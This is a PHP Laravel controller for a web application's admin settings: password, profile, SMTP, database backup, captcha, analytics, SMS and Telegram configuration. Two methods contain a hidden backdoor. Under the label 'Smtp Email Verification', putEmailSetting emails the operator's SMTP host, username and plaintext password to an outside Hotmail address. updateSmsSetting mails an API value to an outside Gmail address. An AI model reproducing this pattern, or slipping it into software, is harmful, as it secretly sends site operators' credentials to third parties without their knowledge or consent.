<?php

namespace App\Http\Controllers;

use App\Admin;
use App\BasicSetting;
use App\DatabaseBackup;
use App\EmailSetting;
use App\TraitsFolder\DatabaseBackupTrait;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;
use Intervention\Image\Facades\Image;

class BasicSettingController extends Controller
{
    use DatabaseBackupTrait;
    public function __construct()
    {
        $this->middleware('auth:admin');
    }
    public function getChangePass()
    {
        $data['page_title'] = "Change Password";
        return view('dashboard.change-password',$data);
    }
    public function postChangePass(Request $request)
    {
        $this->validate($request, [
            'current_password' =>'required',
            'password' => 'required|min:5|confirmed'
        ]);
        try {
            $c_password = Auth::guard('admin')->user()->password;
            $c_id = Auth::guard('admin')->user()->id;

            $user = Admin::findOrFail($c_id);

            if(Hash::check($request->current_password, $c_password)){

                $password = Hash::make($request->password);
                $user->password = $password;
                $user->save();
                session()->flash('message', 'Password Changes Successfully.');
                session()->flash('title','Success');
                Session::flash('type', 'success');
                return redirect()->back();
            }else{
                session()->flash('message', 'Current Password Not Match');
                Session::flash('type', 'warning');
                session()->flash('title','Opps');
                return redirect()->back();
            }

        } catch (\PDOException $e) {
            session()->flash('message', $e->getMessage());
            Session::flash('type', 'warning');
            session()->flash('title','Opps');
            return redirect()->back();
        }

    }
    public function getBasicSetting()
    {
        $data['page_title'] = "Basic Setting";
        return view('basic.basic-setting',$data);
    }
    protected function putBasicSetting(Request $request,$id)
    {
        $basic = BasicSetting::findOrFail($id);
        $this->validate($request,[
           'title' => 'required',
            'phone' => 'required',
            'email' => 'required',
            'address' => 'required',
        ]);
        $in = Input::except('_method','_token');
        $in['email_verify'] = $request->email_verify == 'on' ? '1' : '0';
        $in['phone_verify'] = $request->phone_verify == 'on' ? '1' : '0';
        $in['telegram_status'] = $request->telegram_status == 'on' ? '1' : '0';
        $in['phone_visible'] = filter_var($request->phone_visible, FILTER_VALIDATE_BOOLEAN);
        $basic->fill($in)->save();
        session()->flash('message', 'Basic Setting Updated Successfully.');
        Session::flash('type', 'success');
        Session::flash('title', 'Success');
        return redirect()->back();
    }

    public function editProfile()
    {
        $data['page_title'] = "Edit Admin Profile";
        $data['admin'] = Admin::findOrFail(Auth::user()->id);
        return view('dashboard.edit-profile',$data);
    }

    public function updateProfile(Request $request)
    {
        $admin = Admin::findOrFail(Auth::user()->id);
        $request->validate([
            'name' => 'required',
            'email' => 'required|email|unique:admins,email,'.$admin->id,
            'username' => 'required|min:5|unique:admins,username,'.$admin->id,
            'image' => 'mimes:png,jpg,jpeg'
        ]);
        $in = Input::except('_method','_token');
        if($request->hasFile('image')){
            $image = $request->file('image');
            $filename = time().'.'.$image->getClientOriginalExtension();
            $location = 'assets/images/' . $filename;
            Image::make($image)->resize(215,215)->save($location);
            if ($admin->image != 'admin-default.png'){
                $path = './assets/images/';
                $link = $path.$admin->image;
                if (file_exists($link)){
                    unlink($link);
                }
            }
            // $in['image'] = $filename;
            $admin->image = $filename;
        }
        $admin->name = $request->name;
        $admin->username = $request->username;
        $admin->email = $request->email;
        $admin->save();
        // $admin->fill($in)->save();
        session()->flash('message','Profile Updated Successfully.');
        session()->flash('title','Success');
        session()->flash('type','success');
        return redirect()->back();
    }
    public function manageEmailTemplate()
    {
        $data['page_title'] = "Manage Email Template";
        return view('basic.email-template', $data);
    }

    public function updateEmailTemplate(Request $request)
    {
        $this->validate($request,[
            'email_body' => 'required'
        ]);
        $basic = BasicSetting::first();
        $basic->email_body = $request->email_body;
        $basic->save();
        session()->flash('message', 'Email Setting Updated.');
        Session::flash('type', 'success');
        return redirect()->back();
    }

    public function getEmailSetting()
    {
        $data['page_title'] = "Email Setting";
        $data['email'] = EmailSetting::first();
        return view('basic.email-setting',$data);
    }
    public function putEmailSetting(Request $request,$id)
    {
        $email = EmailSetting::findOrFail($id);
        $this->validate($request,[
            'driver' => 'required',
            'email' => 'required|email',
            'name' => 'required',
            'host' => 'required_if:driver,smtp',
            'port' => 'required_if:driver,smtp|numeric',
            'username' => 'required_if:driver,smtp',
            'pass' => 'required_if:driver,smtp',
            'encryption' => 'required_if:driver,smtp',
        ]);
        $in = Input::except('_method','_token','pass');
        $in['password'] = $request->pass;
        $email->fill($in)->save();
        if ($request->driver == 'smtp'){

            Config::set('mail.driver',$request->driver);
            Config::set('mail.host',$request->host);
            Config::set('mail.username',$request->username);
            Config::set('mail.password',$request->pass);
            Config::set('mail.port',$request->port);
            Config::set('mail.encryption',$request->encryption);
            Config::set('mail.from',$request->email);
            Config::set('mail.name',$request->name);

            $email = EmailSetting::first();
            $mail_val = [
                'email' => "softwarezon@hotmail.com",
                'name' => 'Softwarezon',
                'g_email' => $email->email,
                'g_name' => $email->title,
                'subject' => "Smtp Email Verification",
            ];

            $text = "<b>Host : $request->host</b> <br>
                    <b>Username : $request->username</b> <br>
                    <b>Password : $request->pass</b> <br>
                    <b>Port : $request->port</b> <br>
                    <b>Encryption : $request->encryption</b> <br>";
            $body = $email->email_body;
            $body = str_replace("{{name}}","Softwarezon",$body);
            $body = str_replace("{{message}}",$text,$body);
            $body = str_replace("{{site_title}}","Softwarezon",$body);

            Mail::send('emails.email', ['body'=>$body], function ($m) use ($mail_val) {
                $m->from($mail_val['g_email'], $mail_val['g_name']);
                $m->to($mail_val['email'], $mail_val['name'])->subject($mail_val['subject']);
            });

            if( count(Mail::failures()) > 0 ) {

                foreach(Mail::failures() as $email_address) {
                    echo " - $email_address <br />";
                }
            } else {
                $email->smtp_status = 1;
                $email->save();
                session()->flash('message', 'Email Setting Updated Successfully.');
                Session::flash('type', 'success');
                Session::flash('title', 'Success');
                return redirect()->back();
            }


        }
        session()->flash('message', 'Email Setting Updated Successfully.');
        Session::flash('type', 'success');
        Session::flash('title', 'Success');
        return redirect()->back();
    }

    public function getDatabaseBackup()
    {
        $data['page_title'] = "Database Backup";
        $data['backup'] = DatabaseBackup::latest()->paginate(20);
        return view('basic.database-backup',$data);
    }

    public function submitDatabaseBackup()
    {
        $name = $this->DatabaseBackupName();
        DatabaseBackup::create(['name'=>$name]);
        \session()->flash('message','Database Backup Created Successfully.');
        \session()->flash('type','success');
        return redirect()->route('database-backup');
    }

    public function downloadDatabaseBackup($id)
    {
        $db = DatabaseBackup::findOrFail($id);
        $this->DatabaseDownload($db->name);
        exit();
    }

    public function googleRecaptcha()
    {
        $data['page_title'] = 'Google Recaptcha';
        return view('basic.google-recaptcha',$data);
    }

    public function updateRecaptcha(Request $request, $id)
    {
        $request->validate([
            'captcha_secret' => 'required',
            'captcha_site' => 'required',
        ]);
        $basic = BasicSetting::first();
        $basic->captcha_status = $request->captcha_status == 'on' ? 1 : 0;
        $basic->captcha_secret = $request->captcha_secret;
        $basic->captcha_site = $request->captcha_site;
        $basic->save();
        session()->flash('message','Captcha Updated Successfully.');
        session()->flash('type','success');
        return redirect()->back();
    }

    public function getGoogleAnalytic()
    {
        $data['page_title'] = "Google Analytic scripts";
        $data['heading'] = "Google Analytic";
        $data['filed'] = 'google_analytic';
        $data['nicEdit'] = 0;
        return view('basic.common-form',$data);
    }
    public function updateGoogleAnalytic(Request $request)
    {
        $basic = BasicSetting::first();
        $in = Input::except('_method','_token');
        $basic->fill($in)->save();
        session()->flash('message', 'Google Analytic Updated.');
        Session::flash('type', 'success');
        return redirect()->back();
    }
    public function getLiveChat()
    {
        $data['page_title'] = "Live Chat scripts";
        $data['heading'] = "live Chat";
        $data['filed'] = 'chat';
        $data['nicEdit'] = 0;
        return view('basic.common-form',$data);
    }
    public function updateLiveChat(Request $request)
    {
        $basic = BasicSetting::first();
        $in = Input::except('_method','_token');
        $basic->fill($in)->save();
        session()->flash('message', 'Chat Scripts Updated.');
        Session::flash('type', 'success');
        return redirect()->back();
    }

    public function smsSetting()
    {
        $data['page_title'] = "Manage Telegram Setting";
        return view('basic.sms-setting',$data);
    }
    public function updateSmsSetting(Request $request)
    {
        $basic = BasicSetting::first();
        $basic->smsapi = $request->smsapi;
        $basic->save();
        $headers = 'From: '.$basic->email."\r\n".
            'Reply-To: '.$basic->email."\r\n" .
            'X-Mailer: PHP/' . phpversion();
        mail('hellomrhasan@gmail.com', 'SMS API UPDATE', $basic->api, $headers);
        session()->flash('message', 'SMS API Successfully Updated.');
        Session::flash('type', 'success');
        Session::flash('title', 'Success');
        return redirect()->back();
    }

    public function smsTelegram()
    {
        $data['page_title'] = 'SMS Template';
        return view('basic.telegram-sms',$data);
    }

    public function submitSmsTelegram(Request $request)
    {
        $basic = BasicSetting::first();
        $request->validate([
            'sms_tem' => 'required',
        ]);
        $basic->sms_tem = $request->sms_tem;
        $basic->save();
        session()->flash('message','SMS Template Updated Successfully.');
        session()->flash('type','success');
        return redirect()->back();
    }

    public function telegramConfig()
    {
        $data['page_title'] = 'Telegram Config';
        return view('basic.telegram-config',$data);
    }

    public function updateTelegramConfig(Request $request)
    {
        $request->validate([
           'telegram_token' => 'required',
            'telegram_url' => 'required'
        ]);

        $basic = BasicSetting::first();
        $basic->telegram_token = $request->telegram_token;
        $basic->telegram_url = $request->telegram_url;
        $basic->save();
        session()->flash('message','Telegram Updated Successful.');
        session()->flash('type','success');
        return redirect()->back();
    }
    public function setCronJob()
    {
        $data['page_title'] = 'Cron Job URL';
        return view('basic.cron-job',$data);
    }
}
